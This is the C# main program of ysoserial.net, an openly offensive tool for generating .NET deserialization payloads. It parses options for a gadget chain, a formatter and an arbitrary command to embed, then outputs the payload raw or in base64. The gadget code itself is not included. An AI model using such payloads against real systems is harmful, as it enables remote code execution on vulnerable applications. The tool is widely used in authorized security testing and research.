﻿using ysoserial.Generators;
using ysoserial.Plugins;
using System;
using System.IO;
using System.Linq;
using NDesk.Options;
using System.Runtime.Remoting;
using System.Text;
using System.Collections.Generic;
using ysoserial.Helpers;

namespace ysoserial
{
    class Program
    {
        //Command line arguments
        static string format = "raw";
        static string gadget_name = "";
        static string formatter_name = "";
        static string searchFormatter = "";
        static string cmd = "";
        static bool rawcmd = false;
        static bool cmdstdin = false;
        static string plugin_name = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool show_help = false;
        static bool show_credit = false;
        static bool show_fullhelp = false;
        static bool isDebugMode = false;

        static IEnumerable<string> generators;
        static IEnumerable<string> plugins;

        static OptionSet options = new OptionSet()
            {
                {"p|plugin=", "The plugin to be used.", v => plugin_name = v },
                {"o|output=", "The output format (raw|base64). Default: raw", v => format = v },
                {"g|gadget=", "The gadget chain.", v => gadget_name = v },
                {"f|formatter=", "The formatter.", v => formatter_name = v },
                {"c|command=", "The command to be executed.", v => cmd = v },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after first space is an argument).", v => rawcmd =  v != null },
                {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
                {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable. Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"sf|searchformatter=", "Search in all formatters to show relevant gadgets and their formatters (other parameters will be ignored).", v => searchFormatter =  v},
                {"debugmode", "Enable debugging to show exception errors", v => isDebugMode  =  v != null},
                {"h|help", "Shows this message and exit.", v => show_help = v != null },
                {"fullhelp", "Shows this message + extra options for gadgets and plugins and exit.", v => show_fullhelp = v != null },
                {"credit", "Shows the credit/history of gadgets and plugins (other parameters will be ignored).", v => show_credit =  v != null },
            };

        static void Main(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            try
            {
                List<String> extraArguments = options.Parse(args);
                inputArgs.Cmd = cmd;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.Test = test;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsDebugMode = isDebugMode;
                inputArgs.ExtraArguments = extraArguments;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (show_fullhelp)
            {
                show_help = true;
            }

            if (
                ((cmd == "" && !cmdstdin) || formatter_name == "" || gadget_name == "" || format == "") &&
                plugin_name == "" && !show_credit && searchFormatter == ""
            )
            {
                if(!show_help)
                    Console.WriteLine("Missing arguments. You may need to provide the command parameter even if it is being ignored.");
                show_help = true;
            }

            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());

            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(Generator).IsAssignableFrom(p) && !p.IsInterface);
            generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s=>s, StringComparer.OrdinalIgnoreCase);

            // Populate list of available plugins
            var pluginTypes = types.Where(p => typeof(Plugin).IsAssignableFrom(p) && !p.IsInterface);
            plugins = pluginTypes.Select(x => x.Name.Replace("Plugin", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase); ;

            // Search in formatters
            if (searchFormatter != "")
            {
                SearchFormatters(searchFormatter, inputArgs);
            }

            // Show credits if requested
            if (show_credit)
            {
                ShowCredit();
            }

            // Show help if requested
            if (show_help)
            {
                ShowHelp();
            }

            object raw = null;

            // Try to execute plugin first
            if (plugin_name != "")
            {
                if (!plugins.Contains(plugin_name, StringComparer.OrdinalIgnoreCase))
                {
                    Console.WriteLine("Plugin not supported. Supported plugins are: " + string.Join(" , ", plugins.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                    System.Environment.Exit(-1);
                }

                // Instantiate Plugin 
                Plugin plugin = null;
                try
                {
                    plugin_name = plugins.Where(p => String.Equals(p, plugin_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                    var container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");
                    
                    plugin = (Plugin)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Plugin not supported!");
                    System.Environment.Exit(-1);
                }

                raw = plugin.Run(args);

            }
            // othersiwe run payload generation
            else if ((cmd != "" || cmdstdin) && formatter_name != "" && gadget_name != "" && format != "")
            {
                if (!generators.Contains(gadget_name, StringComparer.CurrentCultureIgnoreCase))
                {
                    Console.WriteLine("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                    System.Environment.Exit(-1);
                }

                // Instantiate Payload Generator
                Generator generator = null;
                try
                {
                    gadget_name = generators.Where(p => String.Equals(p, gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                    var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget_name + "Generator");
                    generator = (Generator)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Gadget not supported!");
                    System.Environment.Exit(-1);
                }

                // Check Generator supports specified formatter
                if (generator.IsSupported(formatter_name))
                {
                    if (cmd == "" && cmdstdin)
                    {
                        cmd = Console.ReadLine();
                    }
                    raw = generator.GenerateWithInit(formatter_name, inputArgs);
                }
                else
                {
                    Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                    System.Environment.Exit(-1);
                }

                // LosFormatter is already base64 encoded
                if (format.ToLower().Equals("base64") && formatter_name.ToLower().Equals("losformatter"))
                {
                    format = "raw";
                }
            }

            // If requested, base64 encode the output
            if (format.ToLower().Equals("base64"))
            {
                if (raw.GetType() == typeof(String))
                {
                    raw = Encoding.ASCII.GetBytes((String)raw);
                }
                string b64encoded = Convert.ToBase64String((byte[])raw);
                Console.WriteLine(b64encoded);
            }
            else
            {
                MemoryStream data = new MemoryStream();
                if (raw.GetType() == typeof(String))
                {
                    data = new MemoryStream(Encoding.UTF8.GetBytes((String)raw ?? ""));
                }
                else if (raw.GetType() == typeof(byte[]))
                {
                    data = new MemoryStream((byte[])raw);
                }
                else
                {
                    Console.WriteLine("Unsupported serialized format");
                    System.Environment.Exit(-1);
                }

                using (Stream console = Console.OpenStandardOutput())
                {
                    byte[] buffer = new byte[4 * 1024];
                    int n = 1;
                    while (n > 0)
                    {
                        n = data.Read(buffer, 0, buffer.Length);
                        console.Write(buffer, 0, n);
                    }
                    console.Flush();
                }
            }
        }

        private static void SearchFormatters(string searchformatter, InputArgs inputArgs)
        {
            Console.WriteLine("Formatter search result for \"" + searchformatter + "\":\n");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        Generator gg = (Generator)container.Unwrap();
                        Boolean gadgetSelected = false;
                        foreach(string formatter in gg.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase))
                        {
                            if (formatter.ToLower().Contains(searchformatter.ToLower()))
                            {
                                if(gadgetSelected == false)
                                {
                                    Console.WriteLine("\t" + gg.Name());
                                    Console.WriteLine("\t\tFound formatters:");
                                    gadgetSelected = true;
                                }
                                Console.WriteLine("\t\t\t" + formatter);
                            }
                        }
                    }
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }

            }
            System.Environment.Exit(-1);
        }

        private static void ShowHelp()
        {
            Console.WriteLine("ysoserial.net generates deserialization payloads for a variety of .NET formatters.");
            Console.WriteLine("");
            if (plugin_name == "")
            {
                Console.WriteLine("== GADGETS ==");
                foreach (string g in generators)
                {
                    try
                    {
                        if (g != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                            Generator gg = (Generator)container.Unwrap();
                            Console.Write("\t(*) ");
                            if (string.IsNullOrEmpty(gg.AdditionalInfo()))
                            {
                                Console.Write(gg.Name());
                            }
                            else
                            {
                                // we have additional info to add!
                                Console.Write(gg.Name() + " [" + gg.AdditionalInfo() + "]");
                            }

                            OptionSet extraOptions = gg.Options();

                            if (extraOptions != null && !show_fullhelp)
                            {
                                Console.Write(" (supports extra options: use the '--fullhelp' argument to view)");
                            }

                            Console.WriteLine();
                            Console.Write("\t\tFormatters: ");
                            Console.WriteLine(string.Join(" , ", gg.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)) + "");

                            if (show_fullhelp)
                            {
                                Console.WriteLine("\t\t\tLabels: " + string.Join(", ", gg.Labels()));
                            }

                            if (extraOptions != null && show_fullhelp)
                            {
                                StringWriter baseTextWriter = new StringWriter();
                                baseTextWriter.NewLine = "\r\n\t\t\t"; // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine("\t\t\tExtra options:");
                                extraOptions.WriteOptionDescriptions(baseTextWriter);
                                Console.Write("\t\t\t"); // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine(baseTextWriter.ToString());
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Gadget not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("== PLUGINS ==");
                foreach (string p in plugins)
                {
                    try
                    {
                        if (p != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                            Plugin pp = (Plugin)container.Unwrap();
                            Console.WriteLine("\t(*) " + pp.Name() + " (" + pp.Description() + ")");
                            
                            OptionSet options = pp.Options();
                            
                            if (options != null && show_fullhelp)
                            {
                                StringWriter baseTextWriter = new StringWriter();
                                baseTextWriter.NewLine = "\r\n\t\t"; // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine("\t\tOptions:");
                                options.WriteOptionDescriptions(baseTextWriter);
                                Console.Write("\t\t"); // this is easier than using string builder and adding spacing to each line!
                                Console.WriteLine(baseTextWriter.ToString());
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Plugin not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("Usage: ysoserial.exe [options]");
                Console.WriteLine("Options:");
                options.WriteOptionDescriptions(Console.Out);
                System.Environment.Exit(0);
            }
            else
            {
                try
                {
                    plugin_name = plugins.Where(p => String.Equals(p, plugin_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                    ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");
                    Plugin pp = (Plugin)container.Unwrap();
                    Console.WriteLine("Plugin:\n");
                    Console.WriteLine(pp.Name() + " (" + pp.Description() + ")");
                    Console.WriteLine("\nOptions:\n");
                    pp.Options().WriteOptionDescriptions(Console.Out);
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                }
                System.Environment.Exit(-1);
            }
        }

        private static void ShowCredit()
        {
            Console.WriteLine("ysoserial.net has been developed by Alvaro Muñoz (@pwntester)");
            Console.WriteLine("");
            Console.WriteLine("Credits for available formatters:");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        Generator gg = (Generator)container.Unwrap();
                        //Console.WriteLine("\t" + gg.Name() + " (" + gg.Description() + ")");
                        Console.WriteLine("\t" + gg.Name());
                        Console.WriteLine("\t\t" + gg.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Gadget not supported");
                    System.Environment.Exit(-1);
                }

            }
            Console.WriteLine("");
            Console.WriteLine("Credits for available plugins:");
            foreach (string p in plugins)
            {
                try
                {
                    if (p != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                        Plugin pp = (Plugin)container.Unwrap();
                        //Console.WriteLine("\t" + pp.Name() + " (" + pp.Description() + ")");
                        Console.WriteLine("\t" + pp.Name());
                        Console.WriteLine("\t\t" + pp.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                    System.Environment.Exit(-1);
                }
            }
            Console.WriteLine("");
            Console.WriteLine("Various other people have also donated their time and contributed to this project.");
            Console.WriteLine("Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.");
            System.Environment.Exit(0);
        }
    }
}
